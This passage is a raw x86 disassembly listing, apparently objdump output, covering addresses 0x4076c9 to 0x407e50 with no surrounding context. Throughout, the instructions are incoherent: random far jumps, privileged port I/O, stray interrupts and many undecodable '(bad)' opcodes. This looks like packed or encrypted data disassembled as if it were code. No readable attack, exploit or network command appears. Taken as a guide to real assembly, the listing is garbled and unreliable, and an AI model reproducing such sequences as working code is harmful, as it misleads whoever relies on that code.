  4076c9:	outs   dx,BYTE PTR ds:[esi]
  4076ca:	xchg   edx,eax
  4076cb:	jmp    0xd704862f
  4076d0:	and    cl,BYTE PTR [esi+0x78]
  4076d3:	iret   
  4076d4:	jmp    0x40767b
  4076d6:	xor    al,bh
  4076d8:	mov    DWORD PTR gs:[esi-0x31111544],ebx
  4076df:	repz sub esp,DWORD PTR [ebx+0x8]
  4076e3:	or     BYTE PTR [eax-0x6bc7da6b],dl
  4076e9:	jne    0x40775a
  4076eb:	mov    edx,0x2a7e8455
  4076f0:	js     0x407737
  4076f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076f3:	ficom  DWORD PTR [eax]
  4076f5:	mov    ds:0xd115444e,al
  4076fa:	add    al,BYTE PTR [ebx+0x35350ef0]
  407700:	xchg   dl,ch
  407702:	out    dx,al
  407703:	pop    edx
  407704:	ja     0x40770c
  407706:	mov    dh,0xea
  407708:	stos   BYTE PTR es:[edi],al
  407709:	dec    esi
  40770a:	ds jb  0x4076ad
  40770d:	xchg   ecx,eax
  40770e:	loopne 0x4076ca
  407710:	imul   edi,DWORD PTR ds:0xb2ded0ee,0xfffffffd
  407717:	cmp    al,0xb3
  407719:	pop    es
  40771a:	jecxz  0x407712
  40771c:	pop    esi
  40771d:	in     eax,0x5b
  40771f:	popa   
  407720:	pop    ebp
  407721:	mov    ds:0xc23b2366,eax
  407726:	cmp    al,0x9e
  407728:	aam    0x7b
  40772a:	mov    ebx,0x2690d742
  40772f:	pop    ebp
  407730:	mov    esp,0xa0aea30b
  407735:	dec    ecx
  407736:	fcmovnu st,st(4)
  407738:	retf   
  407739:	mov    ecx,0xfd4e3e0c
  40773e:	inc    ecx
  40773f:	inc    eax
  407740:	test   ebp,edi
  407742:	jg     0x4076cc
  407744:	gs jae 0x4077bf
  407747:	retf   0x2cb2
  40774a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40774b:	jl     0x407700
  40774d:	jbe    0x407762
  40774f:	fnstcw WORD PTR ds:0x2a83625d
  407755:	mov    esp,0xc896ffdd
  40775a:	push   es
  40775b:	test   BYTE PTR [esi-0x65],al
  40775e:	xor    BYTE PTR [ecx+eax*1-0xfb256d],dl
  407765:	ins    BYTE PTR es:[edi],dx
  407766:	mov    ch,0xbc
  407768:	inc    ebx
  407769:	dec    edi
  40776a:	aam    0x77
  40776c:	sti    
  40776d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40776e:	add    al,0x2f
  407770:	ds dec ebp
  407772:	push   eax
  407773:	sub    ebx,DWORD PTR [ebp+0x8]
  407776:	adc    eax,0xb9ed715e
  40777b:	mov    bh,0x7f
  40777d:	and    esi,DWORD PTR [esi+0x1d]
  407780:	xchg   ecx,eax
  407781:	add    BYTE PTR [ecx],dh
  407783:	scas   al,BYTE PTR es:[edi]
  407784:	sbb    DWORD PTR fs:[ecx],eax
  407787:	xchg   edi,eax
  407788:	mov    ecx,0xea36a221
  40778d:	mov    dl,0x64
  40778f:	ss test eax,0xd4e433cb
  407795:	jmp    0x40780c
  407797:	xchg   DWORD PTR [esi+0x7c],esi
  40779a:	rcr    BYTE PTR [edi],cl
  40779c:	loop   0x40780c
  40779e:	ins    DWORD PTR es:[edi],dx
  40779f:	sbb    eax,0xc0a53d4c
  4077a4:	jo     0x4077e9
  4077a6:	inc    ecx
  4077a7:	je     0x407735
  4077a9:	push   cs
  4077aa:	push   ss
  4077ab:	repz jmp 0xde37:0x5abae1d9
  4077b3:	popa   
  4077b4:	adc    edi,esi
  4077b6:	es pop ds
  4077b8:	mov    eax,eax
  4077ba:	pushf  
  4077bb:	jne    0x4077db
  4077bd:	sub    bl,al
  4077bf:	or     eax,0x30142716
  4077c4:	push   0x22
  4077c6:	jg     0x4077ee
  4077c8:	dec    ebx
  4077c9:	adc    eax,0x7199f47
  4077ce:	jne    0x4077e0
  4077d0:	push   es
  4077d1:	lds    esi,FWORD PTR [eax-0x79]
  4077d4:	ss stos DWORD PTR es:[edi],eax
  4077d6:	ins    BYTE PTR es:[edi],dx
  4077d7:	xor    ebx,DWORD PTR [esi+0x17]
  4077da:	dec    ebp
  4077db:	cwde   
  4077dc:	push   ebx
  4077dd:	or     dh,BYTE PTR [edx-0x33]
  4077e0:	add    BYTE PTR [eax+0x281d6c05],ah
  4077e6:	xor    cl,BYTE PTR [eax]
  4077e8:	and    esi,ebx
  4077ea:	adc    bh,bl
  4077ec:	rol    DWORD PTR [esi+0x68],0x3
  4077f0:	aad    0x81
  4077f2:	jnp    0x407870
  4077f4:	push   cs
  4077f5:	or     ah,ah
  4077f7:	and    al,0x9
  4077f9:	mov    eax,ds:0xea085225
  4077fe:	inc    ecx
  4077ff:	fs mov dl,0x86
  407802:	xchg   ebp,eax
  407803:	inc    ebx
  407804:	int    0xf1
  407806:	xchg   BYTE PTR [edi+0x5066e737],bh
  40780c:	retf   0x56c9
  40780f:	hlt    
  407810:	ds inc eax
  407812:	and    DWORD PTR [edx+0x5d9364c5],esi
  407818:	repnz mov ebp,0xfd4b9608
  40781e:	(bad)  
  40781f:	iret   
  407820:	and    BYTE PTR [edx],cl
  407822:	inc    edx
  407823:	in     eax,0x65
  407825:	mov    edx,0x3cbdb4a
  40782a:	cmp    ecx,DWORD PTR [ecx-0xabcb5b9]
  407830:	shl    BYTE PTR [ebx+0x6d],0xf5
  407834:	stos   BYTE PTR es:[edi],al
  407835:	xchg   ebp,eax
  407836:	loope  0x4077cf
  407838:	in     eax,dx
  407839:	pop    ebx
  40783a:	push   cs
  40783b:	out    0xa5,eax
  40783d:	in     al,dx
  40783e:	stos   BYTE PTR es:[edi],al
  40783f:	std    
  407840:	mov    esi,0x3f025c96
  407845:	aad    0x2e
  407847:	gs or  al,0xe0
  40784a:	dec    ecx
  40784b:	ror    bl,1
  40784d:	inc    esp
  40784e:	mov    eax,0xb98525d9
  407853:	inc    esp
  407854:	dec    eax
  407855:	xor    ecx,DWORD PTR [eax+0x12]
  407858:	mov    al,BYTE PTR [edx+0xa]
  40785b:	mov    al,0xac
  40785d:	add    al,BYTE PTR [edi+ebp*1]
  407860:	sahf   
  407861:	int    0xfa
  407863:	outs   dx,BYTE PTR es:[esi]
  407865:	ficomp WORD PTR [edx-0x1a650866]
  40786b:	adc    dh,BYTE PTR [ebx-0x916b867]
  407871:	sbb    al,0x24
  407873:	into   
  407874:	or     bl,cl
  407876:	hlt    
  407877:	mov    BYTE PTR [esp+ebx*2],ch
  40787a:	sub    eax,0x695330c5
  40787f:	mov    ebx,0xec931457
  407884:	inc    ebx
  407885:	adc    ah,BYTE PTR [edx]
  407887:	cli    
  407888:	sbb    al,0x50
  40788a:	enter  0xa8a,0xa3
  40788e:	inc    edi
  40788f:	pop    edi
  407890:	loop   0x4078a1
  407892:	sbb    al,0xcc
  407894:	pop    ss
  407895:	push   esp
  407896:	shl    BYTE PTR [esi+ebp*1],0xd7
  40789a:	mov    bh,0x81
  40789c:	lods   al,BYTE PTR ds:[esi]
  40789d:	ret    
  40789e:	inc    esi
  40789f:	jae    0x407885
  4078a1:	jbe    0x407915
  4078a3:	jae    0x407826
  4078a5:	lock mov ch,0x32
  4078a8:	add    eax,0x90a2b1ee
  4078ad:	fld    DWORD PTR ss:[edx+eiz*2]
  4078b1:	retf   
  4078b2:	cdq    
  4078b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078b4:	icebp  
  4078b5:	cmp    BYTE PTR [edi-0x62ce069],dh
  4078bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078bc:	adc    esp,ebx
  4078be:	pop    ecx
  4078bf:	xor    DWORD PTR [eax+0x6883fdd7],eax
  4078c5:	stc    
  4078c6:	xchg   ecx,eax
  4078c7:	sub    DWORD PTR [ebx],edi
  4078c9:	imul   eax,edx,0x7d1deb06
  4078cf:	loop   0x40786f
  4078d1:	outs   dx,BYTE PTR ds:[si]
  4078d3:	sahf   
  4078d4:	fst    QWORD PTR [esi+0x68]
  4078d7:	fimul  WORD PTR ds:0xff15293c
  4078dd:	pop    ss
  4078de:	aaa    
  4078df:	(bad)  
  4078e0:	in     al,dx
  4078e1:	push   0x58
  4078e3:	add    cl,BYTE PTR ds:0x65353bc
  4078e9:	jns    0x40791b
  4078eb:	add    ebx,DWORD PTR [ecx-0x59]
  4078ee:	or     ah,BYTE PTR [ebx+0x10]
  4078f1:	imul   ebx,DWORD PTR [ebx+esi*8],0xe
  4078f5:	sbb    esi,edi
  4078f7:	jo     0x4078af
  4078f9:	in     eax,dx
  4078fa:	iret   
  4078fb:	enter  0xca03,0xb6
  4078ff:	rol    BYTE PTR [ebp-0x4f5b46c],cl
  407905:	std    
  407906:	scas   eax,DWORD PTR es:[edi]
  407907:	pop    edi
  407908:	outs   dx,BYTE PTR ds:[esi]
  407909:	fiadd  WORD PTR [esi-0x6a]
  40790c:	lea    ebx,[edi+ecx*1]
  40790f:	jg     0x407967
  407911:	sahf   
  407912:	clc    
  407913:	sahf   
  407914:	out    dx,eax
  407915:	mov    cl,0x5a
  407917:	ret    0xd112
  40791a:	mov    edi,0xe270832a
  40791f:	fiadd  DWORD PTR [edx-0x2023f142]
  407925:	cmp    al,0x6
  407927:	rol    BYTE PTR [eax],0xc4
  40792a:	imul   DWORD PTR [edi+ebp*1]
  40792d:	xor    ecx,0xffffff88
  407930:	sub    dh,BYTE PTR [edx]
  407932:	xor    eax,0xb90ff0e7
  407937:	or     cl,ch
  407939:	pusha  
  40793a:	addr16 ss ss xchg ebx,eax
  40793e:	icebp  
  40793f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407940:	add    eax,0xf108fdd3
  407945:	pop    ebp
  407946:	iret   
  407947:	adc    eax,DWORD PTR ds:0xc9f22380
  40794d:	ins    BYTE PTR es:[edi],dx
  40794e:	cmp    DWORD PTR [eax],ebp
  407950:	mov    esi,0x6a7e87a7
  407955:	xchg   ebp,eax
  407956:	das    
  407957:	jne    0x4079a6
  407959:	imul   ecx,DWORD PTR [ebx],0xe9aa532e
  40795f:	mov    eax,ds:0x4f3e86f0
  407964:	cmp    eax,eax
  407966:	in     eax,0xdf
  407968:	out    0xa3,eax
  40796a:	mov    esp,0x588a9a2b
  40796f:	cmp    ah,BYTE PTR [ebx]
  407971:	push   edi
  407972:	(bad)  
  407973:	push   edx
  407974:	mov    ebp,0x6b015259
  407979:	and    BYTE PTR [ebp-0x6ba34db3],cl
  40797f:	in     al,dx
  407980:	imul   ebx,ebp,0xffffffa1
  407983:	das    
  407984:	je     0x407982
  407986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407987:	mov    bh,0x69
  407989:	imul   eax,DWORD PTR [edi+0x65e40e79],0x59cdba22
  407993:	aad    0x1e
  407995:	(bad)  
  407996:	in     eax,dx
  407997:	aam    0x53
  407999:	ja     0x4079cb
  40799b:	aaa    
  40799c:	stc    
  40799d:	or     DWORD PTR [esi+0x3c402155],eax
  4079a3:	mov    esi,0x7c8d5671
  4079a8:	clc    
  4079a9:	xor    esi,ebp
  4079ab:	and    eax,0xe4cfcded
  4079b0:	mov    eax,0x72afd8d5
  4079b5:	loop   0x4079fe
  4079b7:	inc    esp
  4079b8:	cwde   
  4079b9:	cmp    al,0xa6
  4079bb:	test   al,0x5
  4079bd:	dec    ebp
  4079be:	sbb    BYTE PTR [edx+0x2a],dh
  4079c1:	xchg   ecx,eax
  4079c2:	or     esp,DWORD PTR [ecx]
  4079c4:	repz (bad) 
  4079c6:	jle    0x407998
  4079c8:	fild   DWORD PTR [edx+0x24250085]
  4079ce:	cld    
  4079cf:	ret    
  4079d0:	push   ecx
  4079d1:	inc    ecx
  4079d2:	adc    eax,0xd03f774f
  4079d7:	inc    esp
  4079d8:	sti    
  4079d9:	repnz or edi,ebp
  4079dc:	cmp    DWORD PTR [ecx-0x32],edx
  4079df:	mov    al,0xf
  4079e1:	cmp    eax,0x9c56c9f
  4079e6:	retf   0x9e8
  4079e9:	fisttp DWORD PTR [edi+ecx*4]
  4079ec:	xchg   edx,eax
  4079ed:	xchg   ebp,eax
  4079ee:	pop    ecx
  4079ef:	int    0x84
  4079f1:	jmp    ebx
  4079f3:	mov    cs,esp
  4079f5:	mov    cl,0xd4
  4079f7:	jg     0x407a35
  4079f9:	in     eax,dx
  4079fa:	add    al,0x47
  4079fc:	(bad)  
  4079fd:	clc    
  4079fe:	lock inc esi
  407a00:	xchg   ebx,eax
  407a01:	ins    DWORD PTR es:[edi],dx
  407a02:	mov    dh,0x17
  407a04:	das    
  407a05:	sbb    eax,DWORD PTR [ecx]
  407a07:	lods   eax,DWORD PTR ds:[esi]
  407a08:	test   edx,esi
  407a0a:	add    al,0x8c
  407a0c:	fidiv  WORD PTR [esp+eax*4-0xe4f564]
  407a13:	jns    0x407a1c
  407a15:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  407a17:	push   es
  407a18:	sbb    eax,0xda4dcc2
  407a1d:	rcl    BYTE PTR [eax+0x12a3ffab],0x12
  407a24:	es push 0xffffff87
  407a27:	push   0xffffffca
  407a29:	jmp    DWORD PTR ss:[esi]
  407a2c:	cmp    al,0x8
  407a2e:	xchg   edx,eax
  407a2f:	pop    ebp
  407a30:	xchg   ebp,eax
  407a31:	push   ecx
  407a32:	(bad)  
  407a33:	int    0xb1
  407a35:	in     al,dx
  407a36:	shl    ah,0x6a
  407a39:	pop    edx
  407a3a:	(bad)  
  407a3b:	scas   eax,DWORD PTR es:[edi]
  407a3c:	dec    ebp
  407a3d:	jae    0x407a5a
  407a3f:	sub    BYTE PTR [edx],al
  407a41:	push   cs
  407a42:	pushf  
  407a43:	mov    ah,0x81
  407a45:	dec    edi
  407a46:	push   edi
  407a47:	int3   
  407a48:	inc    ecx
  407a49:	dec    eax
  407a4b:	sar    BYTE PTR [ebx],1
  407a4d:	aam    0x88
  407a4f:	pop    ds
  407a50:	push   esi
  407a51:	aaa    
  407a52:	imul   esp,DWORD PTR [edx],0x18aaa2fa
  407a58:	fs sbb al,0xa6
  407a5b:	jmp    DWORD PTR [ecx]
  407a5d:	popa   
  407a5e:	test   DWORD PTR [esi],0xbceaa47
  407a64:	add    ebx,eax
  407a66:	sti    
  407a67:	dec    ecx
  407a68:	in     al,dx
  407a69:	in     al,dx
  407a6a:	pop    ss
  407a6b:	push   esp
  407a6c:	mov    dl,0xe9
  407a6e:	ins    BYTE PTR es:[edi],dx
  407a6f:	xor    DWORD PTR [esi],edx
  407a71:	sub    BYTE PTR [edx+0x55a3303b],bh
  407a77:	popa   
  407a78:	fdivr  QWORD PTR [ebp-0x54049264]
  407a7e:	rcr    BYTE PTR [edi-0x18b7de27],0xcb
  407a85:	sbb    DWORD PTR [edx-0x5f415508],esp
  407a8b:	mov    dh,BYTE PTR [ecx-0x5049c708]
  407a91:	mov    ch,0xc2
  407a93:	out    dx,al
  407a94:	pop    ds
  407a95:	sbb    BYTE PTR [edx+0x69799b29],bh
  407a9b:	int    0xc1
  407a9d:	dec    esi
  407a9e:	cld    
  407a9f:	test   al,0x3d
  407aa1:	in     eax,0x12
  407aa3:	call   0x909c:0xc4053816
  407aaa:	mov    edx,0xd02cb500
  407aaf:	lock cmp eax,0xa4734bfb
  407ab5:	arpl   WORD PTR [edi+esi*1-0x4e],ax
  407ab9:	iret   
  407aba:	xchg   esp,eax
  407abb:	inc    esi
  407abc:	ins    DWORD PTR es:[edi],dx
  407abd:	cwde   
  407abe:	addr16 out 0xd9,al
  407ac1:	jb     0x407b26
  407ac3:	add    ah,BYTE PTR [ebx+0x2db375d7]
  407ac9:	mov    BYTE PTR [edx-0x1e],0x2
  407acd:	pop    ecx
  407ace:	jp     0x407ada
  407ad0:	(bad)  
  407ad1:	imul   edx,DWORD PTR [esi],0xffffffbe
  407ad4:	loop   0x407b1d
  407ad6:	lahf   
  407ad7:	sbb    BYTE PTR [esp+ecx*2-0x14],cl
  407adb:	aad    0xd3
  407add:	adc    ah,ch
  407adf:	and    al,0x83
  407ae1:	lahf   
  407ae2:	retf   0x5cc1
  407ae5:	and    eax,0x3f248e83
  407aea:	xor    DWORD PTR [edi-0x7e],0xffffffc4
  407aee:	mov    ebx,DWORD PTR [ebp-0x692469b1]
  407af4:	jmp    0x407b36
  407af6:	lods   eax,DWORD PTR ds:[esi]
  407af7:	push   eax
  407af8:	pusha  
  407af9:	jnp    0x407b06
  407afb:	test   bl,bl
  407afd:	push   esp
  407afe:	stc    
  407aff:	retf   0xf4d9
  407b02:	mov    edx,0x84693476
  407b07:	jb     0x407b26
  407b09:	nop
  407b0a:	test   BYTE PTR [esi+0x50],bh
  407b0d:	(bad)  
  407b0e:	int    0x38
  407b10:	sub    DWORD PTR [eax+ebx*4],ebx
  407b13:	nop
  407b14:	and    al,0x1c
  407b16:	push   edi
  407b17:	mov    eax,0x690299b7
  407b1c:	scas   al,BYTE PTR es:[edi]
  407b1d:	test   eax,0xe3d4a26f
  407b22:	jnp    0x407b07
  407b24:	jbe    0x407af0
  407b26:	or     eax,0x4ab923d9
  407b2b:	ss jne 0x407ac5
  407b2e:	mov    edi,0xc7daa623
  407b33:	or     al,0xb5
  407b35:	xchg   edi,eax
  407b36:	sahf   
  407b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b38:	cmp    al,0x8
  407b3a:	aad    0x80
  407b3c:	int3   
  407b3d:	mov    ecx,esp
  407b3f:	mov    eax,0x3baf017c
  407b44:	in     eax,dx
  407b45:	ds xchg ebx,eax
  407b47:	or     al,0x72
  407b49:	fs sbb al,0xd5
  407b4c:	scas   eax,DWORD PTR es:[edi]
  407b4d:	cmp    al,0xe5
  407b4f:	(bad)  
  407b50:	xchg   ebp,eax
  407b51:	hlt    
  407b52:	ss pop edx
  407b54:	push   edi
  407b55:	mov    al,0xa7
  407b57:	sub    esi,DWORD PTR [ebx+0x73]
  407b5a:	xlat   BYTE PTR ds:[ebx]
  407b5b:	add    eax,0xe22aff2
  407b60:	pop    ecx
  407b61:	aaa    
  407b62:	jae    0x407b23
  407b64:	pop    ss
  407b65:	test   al,0x7d
  407b67:	inc    ebp
  407b68:	ror    cl,cl
  407b6a:	jle    0x407b2e
  407b6c:	out    dx,eax
  407b6d:	sbb    ecx,DWORD PTR [esp+esi*4]
  407b70:	dec    esp
  407b71:	jne    0x407b98
  407b73:	sub    cl,bl
  407b75:	and    al,bh
  407b77:	ret    
  407b78:	pop    esp
  407b79:	scas   al,BYTE PTR es:[edi]
  407b7a:	imul   ebx,DWORD PTR [ebx],0x7021014a
  407b80:	jno    0x407b86
  407b82:	in     al,0x42
  407b84:	push   cs
  407b85:	mov    eax,ds:0xf31211c8
  407b8a:	jno    0x407b87
  407b8c:	test   eax,0x39e4759e
  407b91:	dec    eax
  407b92:	inc    esp
  407b93:	adc    al,0x39
  407b95:	fild   WORD PTR ds:0x6c3778df
  407b9b:	bound  esi,QWORD PTR ds:[edx+0x25]
  407b9f:	mov    ebp,DWORD PTR [esi+0xe871e19]
  407ba5:	hlt    
  407ba6:	ss loop 0x407b73
  407ba9:	or     eax,0xb9d4613e
  407bae:	pop    eax
  407baf:	pop    esp
  407bb0:	ins    BYTE PTR es:[edi],dx
  407bb1:	inc    eax
  407bb2:	mov    ah,0x9d
  407bb4:	out    0x75,eax
  407bb6:	clc    
  407bb7:	add    BYTE PTR [ecx-0x77],cl
  407bba:	or     DWORD PTR ds:0xf109b21,esp
  407bc0:	push   ebp
  407bc1:	mov    ecx,0x94eae62e
  407bc6:	scas   al,BYTE PTR es:[edi]
  407bc7:	sub    cl,BYTE PTR [ebp+0x17c6eb89]
  407bcd:	push   edi
  407bce:	pop    esp
  407bcf:	sub    al,0x2b
  407bd1:	xor    bh,bh
  407bd3:	push   ebx
  407bd4:	xchg   edx,eax
  407bd5:	dec    eax
  407bd6:	adc    al,0x2d
  407bd8:	ficom  WORD PTR [eax-0x45]
  407bdb:	push   cs
  407bdc:	ins    BYTE PTR es:[edi],dx
  407bdd:	pop    ebx
  407bde:	nop
  407bdf:	push   ecx
  407be0:	add    ebx,0x82b4468e
  407be6:	sbb    ch,al
  407be8:	pop    es
  407be9:	jg     0x407b7c
  407beb:	jno    0x407c48
  407bed:	dec    ebp
  407bee:	xchg   esi,eax
  407bef:	cmp    DWORD PTR [ebx-0x2c75c768],edx
  407bf5:	adc    al,0x7e
  407bf7:	imul   ebx,DWORD PTR [edx-0x76],0xf9a6d35d
  407bfe:	rol    DWORD PTR [esp+eiz*8],cl
  407c01:	mov    ds:0x22cd844f,eax
  407c06:	jp     0x407c4e
  407c08:	imul   si,si,0x3
  407c0c:	dec    ebx
  407c0d:	mov    ecx,0x1c725a02
  407c12:	cmp    ch,dl
  407c14:	push   0xaba534c
  407c19:	lods   al,BYTE PTR ds:[esi]
  407c1a:	mov    dh,0x7f
  407c1c:	jne    0x407c2c
  407c1e:	test   eax,0x8ccf4203
  407c23:	mov    ah,0xe1
  407c25:	imul   ecx,DWORD PTR [esi],0x45
  407c28:	jmp    0x89f1b77c
  407c2d:	add    al,0x8e
  407c2f:	je     0x407caa
  407c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c32:	mov    eax,?
  407c34:	aaa    
  407c35:	or     ah,ah
  407c37:	sub    eax,0x940a8756
  407c3c:	fnstsw WORD PTR ds:0x912d5677
  407c42:	fs addr16 cmp al,0xfc
  407c46:	retf   0xa96e
  407c49:	jg     0x407c5d
  407c4b:	shl    DWORD PTR [ebp-0x196907f3],0xcb
  407c52:	xchg   ecx,eax
  407c53:	mov    esp,0x29e00f8
  407c58:	int    0x90
  407c5a:	cld    
  407c5b:	and    ah,BYTE PTR [di-0x6afe]
  407c60:	pop    ss
  407c61:	jns    0x407cb6
  407c63:	std    
  407c64:	cmp    ecx,DWORD PTR [edi]
  407c66:	mov    eax,0x6b758f9d
  407c6b:	lds    edx,FWORD PTR [ebx+0x1025eeed]
  407c71:	test   ecx,esi
  407c73:	jnp    0x407c8a
  407c75:	adc    DWORD PTR [eax-0x6b],edi
  407c78:	dec    esi
  407c79:	imul   DWORD PTR [ebx+eax*8]
  407c7c:	dec    eax
  407c7d:	mov    bl,0x62
  407c7f:	enter  0x17c4,0xce
  407c83:	adc    al,0xff
  407c85:	adc    eax,edi
  407c87:	inc    ecx
  407c88:	inc    edx
  407c89:	xor    ebp,0x2a
  407c8c:	cmp    BYTE PTR [edx],ah
  407c8e:	mov    BYTE PTR [ecx-0x2f],bh
  407c91:	xchg   esp,eax
  407c92:	rcr    DWORD PTR [edi],cl
  407c94:	sbb    edi,DWORD PTR [edx-0x10]
  407c97:	add    DWORD PTR [esi-0x33853bbb],ebp
  407c9d:	mov    al,0x35
  407c9f:	(bad)  
  407ca0:	(bad)  
  407ca1:	test   DWORD PTR [ecx],edi
  407ca3:	jg     0x407ce7
  407ca5:	mov    cl,0x7b
  407ca7:	mov    ds:0xf95fbb28,eax
  407cac:	sub    ecx,DWORD PTR [ebp+0x60]
  407caf:	in     al,dx
  407cb0:	dec    esp
  407cb1:	popf   
  407cb2:	out    0x30,eax
  407cb4:	fs scas al,BYTE PTR es:[edi]
  407cb6:	(bad)  
  407cb8:	pop    es
  407cb9:	sti    
  407cba:	push   ss
  407cbb:	(bad)  
  407cbc:	rol    DWORD PTR [eax-0x12ce7b78],1
  407cc2:	mov    dh,0x53
  407cc4:	cdq    
  407cc5:	add    ebp,esi
  407cc7:	xor    al,0x97
  407cc9:	cmp    ah,BYTE PTR [esi]
  407ccb:	dec    esi
  407ccc:	cmp    DWORD PTR [ecx+ecx*1-0x42],0xffffffec
  407cd1:	gs je  0x407cc5
  407cd4:	xor    BYTE PTR [edx+esi*1-0x60],dl
  407cd8:	pop    esi
  407cd9:	fdiv   st,st(3)
  407cdb:	cmp    eax,0x696faa4f
  407ce0:	mov    ah,0xdd
  407ce2:	enter  0xba27,0x13
  407ce6:	xor    eax,DWORD PTR [esi+0x39]
  407ce9:	mov    WORD PTR [edx],ds
  407ceb:	cmc    
  407cec:	mul    DWORD PTR [edi+0x608afc7b]
  407cf2:	pop    ss
  407cf3:	int3   
  407cf4:	mov    ecx,0xae1b8994
  407cf9:	pop    ecx
  407cfa:	push   edx
  407cfb:	pop    ebp
  407cfc:	retf   0xd9c3
  407cff:	rcl    edx,cl
  407d01:	loopne 0x407ca3
  407d03:	pop    ds
  407d04:	es push ebp
  407d06:	mov    ebx,0x8e63103a
  407d0b:	mov    ebp,0x268377ae
  407d10:	xor    eax,0xee053817
  407d15:	rcr    edx,cl
  407d17:	sbb    BYTE PTR [edi+0x0],0xba
  407d1b:	lds    eax,FWORD PTR [ebx]
  407d1d:	retf   
  407d1e:	adc    eax,0x4d1c8dad
  407d23:	in     eax,dx
  407d24:	mov    ch,0xec
  407d26:	aaa    
  407d27:	pop    eax
  407d28:	int3   
  407d29:	test   eax,0x1e2ebb02
  407d2e:	mov    al,ds:0x2e9378fd
  407d33:	popa   
  407d34:	les    edx,FWORD PTR [ecx-0x25]
  407d37:	ins    BYTE PTR es:[edi],dx
  407d38:	mov    esp,0x1345afa2
  407d3d:	std    
  407d3e:	sti    
  407d3f:	ret    0x489f
  407d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d43:	test   al,0x5b
  407d45:	xor    eax,0xc6259ace
  407d4a:	lds    ebx,FWORD PTR [edi+ebp*2-0x61]
  407d4e:	mov    esi,0x62ebebe8
  407d53:	popa   
  407d54:	out    0x28,eax
  407d56:	das    
  407d57:	std    
  407d58:	sbb    al,BYTE PTR [eax+ebx*1-0x53]
  407d5c:	adc    eax,0x972cba31
  407d61:	mov    al,0x79
  407d63:	shl    edx,cl
  407d65:	push   cs
  407d66:	shr    DWORD PTR gs:[edi-0x15d2c25a],0x98
  407d6e:	sbb    DWORD PTR [edi],esp
  407d70:	dec    ebp
  407d71:	dec    esi
  407d72:	dec    ebp
  407d73:	out    0x51,eax
  407d75:	out    dx,eax
  407d76:	bound  ebp,QWORD PTR [eax]
  407d78:	mov    cl,0x0
  407d7a:	jbe    0x407d1a
  407d7c:	and    al,0xdc
  407d7e:	mov    cl,0x9d
  407d80:	lea    ecx,[eax+eax*4]
  407d83:	scas   eax,DWORD PTR es:[edi]
  407d84:	sbb    esi,DWORD PTR [edi-0xf]
  407d87:	ins    BYTE PTR es:[edi],dx
  407d88:	and    dh,BYTE PTR [edi-0x1f4ff3b5]
  407d8e:	mov    cl,0x44
  407d90:	fcom   DWORD PTR [ecx+0x28511dd0]
  407d96:	and    ebp,edx
  407d98:	push   cs
  407d99:	xor    DWORD PTR [edx],ecx
  407d9b:	or     DWORD PTR [esi-0x11],esi
  407d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d9f:	and    edi,DWORD PTR [eax-0x71ee723a]
  407da5:	pop    eax
  407da6:	push   ebp
  407da7:	out    dx,al
  407da8:	xchg   ecx,eax
  407da9:	jae    0x407d57
  407dab:	icebp  
  407dac:	dec    esi
  407dad:	lds    edx,FWORD PTR [eax]
  407daf:	mov    edi,0x5a31e2b5
  407db4:	(bad)
  407db8:	outs   dx,BYTE PTR ds:[esi]
  407db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dba:	jb     0x407d43
  407dbc:	pop    edi
  407dbd:	aas    
  407dbe:	sub    cl,BYTE PTR [edx+ebp*4-0x2c6f97c3]
  407dc5:	ins    DWORD PTR es:[edi],dx
  407dc6:	adc    eax,0x2028283a
  407dcb:	repz mov eax,ds:0x9a55823e
  407dd1:	fnsave [eax]
  407dd3:	sub    esp,DWORD PTR [ecx+0x2c]
  407dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd7:	outs   dx,DWORD PTR ds:[esi]
  407dd9:	mov    dh,0xe1
  407ddb:	push   0xffffffde
  407ddd:	fidiv  DWORD PTR [edx+ebp*2]
  407de0:	xchg   ebx,eax
  407de1:	add    dh,BYTE PTR [esp+ebx*1-0x4c42d530]
  407de8:	sub    edx,ecx
  407dea:	in     al,0x81
  407dec:	nop
  407ded:	sub    esp,DWORD PTR [eax]
  407def:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407df0:	xchg   esi,eax
  407df1:	mov    ds:0x114c4e9,eax
  407df6:	sub    BYTE PTR [ebx-0x40fedbf0],ch
  407dfc:	push   ebp
  407dfd:	push   ecx
  407dfe:	ss sbb esp,edi
  407e01:	push   edi
  407e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e03:	test   eax,0x8b63b3e2
  407e08:	mov    bl,0x54
  407e0a:	mov    ebp,0xbf333376
  407e0f:	push   edi
  407e10:	jae    0x407d99
  407e12:	pop    es
  407e13:	xor    esi,DWORD PTR [edi+0x55]
  407e16:	in     al,0xd3
  407e18:	xchg   ecx,eax
  407e19:	mov    eax,0x15ba4b62
  407e1e:	cmp    ebx,DWORD PTR [ebp+0x5c]
  407e21:	ret    
  407e22:	nop
  407e23:	cli    
  407e24:	in     al,0xdf
  407e26:	inc    esp
  407e27:	mov    ebp,edi
  407e29:	add    dh,dh
  407e2b:	or     dh,bl
  407e2d:	push   0xffffff86
  407e2f:	jmp    FWORD PTR [ebx]
  407e31:	cwde   
  407e32:	retf   0x5b9c
  407e35:	push   edi
  407e36:	xchg   ecx,eax
  407e37:	mov    ds:0xf0e0db27,al
  407e3c:	mov    ah,0xe1
  407e3e:	je     0x407e64
  407e40:	jle    0x407e48
  407e42:	push   ebx
  407e43:	rcr    BYTE PTR [ebx],cl
  407e45:	cmp    al,0x3d
  407e47:	fwait
  407e48:	xor    eax,edi
  407e4a:	pop    ebp
  407e4b:	loopne 0x407e7c
  407e4d:	xor    BYTE PTR [ebp-0x2f],dl
  407e50:	sub    ah,BYTE PTR [esi]
